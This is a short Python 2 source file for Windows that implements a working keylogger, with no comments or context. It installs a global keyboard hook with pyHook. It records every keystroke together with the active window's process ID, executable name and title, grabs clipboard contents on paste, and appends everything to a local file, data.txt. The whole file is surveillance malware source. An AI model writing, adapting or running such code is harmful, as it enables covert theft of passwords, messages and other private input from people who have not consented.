from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

a = open('data.txt', 'a')
a.close()
def get_current_windows():
	hward = user32.GetForegroundWindow()
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hward, byref(pid))
	process_id = '%d' % pid.value
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
	psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
	
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hward, byref(window_title), 512)
	
	print 
	print "[PID: %s- %s -%s]" % (process_id, executable.value, window_title.value)
	print
	a = open('data.txt', 'a')
	a.write('\n')
	a.write("[PID: %s- %s -%s]" % (process_id, executable.value, window_title.value))
	a.write('\n')
	a.close()
	kernel32.CloseHandle(hward)
	kernel32.CloseHandle(h_process)
	
	
def KeyStroke(event):
	global current_window
	a = open('data.txt', 'a')
	if event.WindowName != current_window:
		current_window = event.WindowName
		get_current_windows()
	
	if event.Ascii > 32 and event.Ascii < 127:
		print chr(event.Ascii),
		
		a.write(chr(event.Ascii))
	else:
		if event.Key == 'V':
			
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			
			print '[PASYE]- %s' % (pasted_value)
			a.write('[PASYE]- %s' % (pasted_value))
		else:
			print '[%s]' % event.Key,
			a.write('[%s]' % event.Key,)
	
	a.close()
	return True

	
k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke

k1.HookKeyboard()
pythoncom.PumpMessages()
	